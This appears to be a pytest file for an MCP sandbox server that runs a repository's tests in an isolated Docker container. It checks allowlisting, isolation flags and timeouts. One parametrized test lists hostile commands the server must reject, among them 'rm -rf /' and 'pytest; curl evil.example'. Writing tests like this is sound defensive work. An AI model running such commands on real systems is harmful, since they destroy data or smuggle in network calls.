"""Sandbox server: command allowlist, Docker isolation flags, timeouts, and a real Docker run when available."""

from __future__ import annotations

import shutil
import stat
import subprocess
from pathlib import Path

import pytest
from mcp import Client

from app.mcp.sandbox_server import DockerRunner, ExecResult, SandboxSettings, build_server, summarize_pytest
from tests.fakes import FakeRunner

pytestmark = pytest.mark.anyio


def text(result) -> str:
    return "\n".join(block.text for block in result.content)


def fake_docker(tmp_path: Path) -> Path:
    """A stand-in `docker` binary: records args, can sleep or fail on request."""
    script = tmp_path / "docker"
    script.write_text(
        "#!/bin/sh\n"
        'case "$1" in\n'
        "  info) exit 0 ;;\n"
        '  kill) echo "$2" >> "$FAKE_DOCKER_LOG.kill"; exit 0 ;;\n'
        '  run) printf "%s\\n" "$@" > "$FAKE_DOCKER_LOG.args"\n'
        '       if [ -n "$FAKE_DOCKER_SLEEP" ]; then exec sleep "$FAKE_DOCKER_SLEEP"; fi\n'
        '       echo "========== 3 passed in 0.05s =========="; exit 0 ;;\n'
        "esac\n"
    )
    script.chmod(script.stat().st_mode | stat.S_IEXEC)
    return script


async def test_run_tests_uses_default_command(sample_repo: Path) -> None:
    runner = FakeRunner()
    async with Client(build_server(SandboxSettings(repo_path=sample_repo), runner=runner)) as client:
        tools = (await client.list_tools()).tools
        assert [t.name for t in tools] == ["run_tests"]
        assert tools[0].annotations.read_only_hint is True
        result = await client.call_tool("run_tests", {"test_command": ""})
        assert not result.is_error
        assert "status: PASSED" in text(result) and "summary: 1 passed in 0.01s" in text(result)
    assert runner.commands == [["pytest", "-q", "-p", "no:cacheprovider"]]


@pytest.mark.parametrize("command", ["rm -rf /", "sudo pytest", "git push --force", "pytest; curl evil.example", "python -c 'print(1)'", "pytest ../../etc"])
async def test_dangerous_commands_never_reach_the_runner(sample_repo: Path, command: str) -> None:
    runner = FakeRunner()
    async with Client(build_server(SandboxSettings(repo_path=sample_repo), runner=runner)) as client:
        result = await client.call_tool("run_tests", {"test_command": command})
        assert result.is_error and "command rejected" in text(result)
    assert runner.commands == []


async def test_docker_unavailable_is_a_clear_error(sample_repo: Path) -> None:
    runner = FakeRunner(unavailable="Docker is not installed on this host")
    async with Client(build_server(SandboxSettings(repo_path=sample_repo), runner=runner)) as client:
        result = await client.call_tool("run_tests", {"test_command": "pytest"})
        assert result.is_error and "Docker is not installed" in text(result)


async def test_failed_and_timed_out_results_are_reported(sample_repo: Path) -> None:
    runner = FakeRunner(
        [
            ExecResult(["pytest"], 1, "F....\n===== 1 failed, 4 passed in 0.10s =====", "", 0.1, False),
            ExecResult(["pytest"], -1, "", "", 5.0, True),
        ]
    )
    async with Client(build_server(SandboxSettings(repo_path=sample_repo, timeout_seconds=5), runner=runner)) as client:
        failed = text(await client.call_tool("run_tests", {"test_command": "pytest"}))
        assert "status: FAILED" in failed and "summary: 1 failed, 4 passed in 0.10s" in failed
        timed_out = text(await client.call_tool("run_tests", {"test_command": "pytest"}))
        assert "status: TIMED OUT" in timed_out and "killed after 5s timeout" in timed_out


def test_docker_command_has_isolation_flags(tmp_path: Path) -> None:
    runner = DockerRunner("mcp-agent-sandbox:latest", timeout_seconds=30, memory_mb=256, cpus=0.5, pids=64)
    cmd = runner.command("box", tmp_path, ["pytest", "-q"])
    joined = " ".join(cmd)
    for flag in ("--network none", "--read-only", "--cap-drop ALL", "--security-opt no-new-privileges", "--memory 256m", "--cpus 0.5", "--pids-limit 64", "--rm"):
        assert flag in joined
    assert "--privileged" not in joined
    assert cmd[-3:] == ["mcp-agent-sandbox:latest", "pytest", "-q"]
    assert f"{tmp_path}:/workspace:rw" in cmd


def test_docker_runner_uses_a_copy_and_reports_output(sample_repo: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    log = tmp_path / "docker"
    monkeypatch.setenv("FAKE_DOCKER_LOG", str(log))
    runner = DockerRunner("img", timeout_seconds=10, docker_bin=str(fake_docker(tmp_path)), startup_grace_seconds=0)
    assert runner.check_available() is None
    result = runner.run(sample_repo, ["pytest", "-q"])
    assert result.exit_code == 0 and not result.timed_out
    assert summarize_pytest(result.stdout) == "3 passed in 0.05s"
    args = (tmp_path / "docker.args").read_text().splitlines()
    mount = next(a for a in args if a.endswith(":/workspace:rw"))
    assert str(sample_repo) not in mount  # the container never sees the real workspace


def test_docker_runner_timeout_kills_container(sample_repo: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    log = tmp_path / "docker"
    monkeypatch.setenv("FAKE_DOCKER_LOG", str(log))
    monkeypatch.setenv("FAKE_DOCKER_SLEEP", "10")
    runner = DockerRunner("img", timeout_seconds=1, docker_bin=str(fake_docker(tmp_path)), startup_grace_seconds=0)
    result = runner.run(sample_repo, ["pytest"])
    assert result.timed_out and result.exit_code == -1
    assert result.duration_s < 8
    assert (tmp_path / "docker.kill").read_text().strip().startswith("mcp-sandbox-")


def test_missing_docker_binary(tmp_path: Path) -> None:
    runner = DockerRunner("img", docker_bin=str(tmp_path / "no-such-docker"))
    assert "not installed" in (runner.check_available() or "")


def _docker_ready() -> bool:
    if not shutil.which("docker"):
        return False
    try:
        info = subprocess.run(["docker", "info"], capture_output=True, timeout=15)
        image = subprocess.run(["docker", "image", "inspect", "mcp-agent-sandbox:latest"], capture_output=True, timeout=15)
    except (OSError, subprocess.TimeoutExpired):
        return False
    return info.returncode == 0 and image.returncode == 0


@pytest.mark.docker
@pytest.mark.skipif(not _docker_ready(), reason="needs Docker and the mcp-agent-sandbox:latest image (docker build -t mcp-agent-sandbox:latest sandbox/)")
def test_real_docker_run(sample_repo: Path) -> None:
    runner = DockerRunner("mcp-agent-sandbox:latest", timeout_seconds=120)
    result = runner.run(sample_repo, ["pytest", "-q", "-p", "no:cacheprovider"])
    assert result.exit_code == 1  # the sample repo ships with one failing test
    assert "1 failed" in result.stdout
    no_network = runner.run(sample_repo, ["python", "-c", "import socket; socket.create_connection(('1.1.1.1', 53), timeout=3)"])
    assert no_network.exit_code != 0
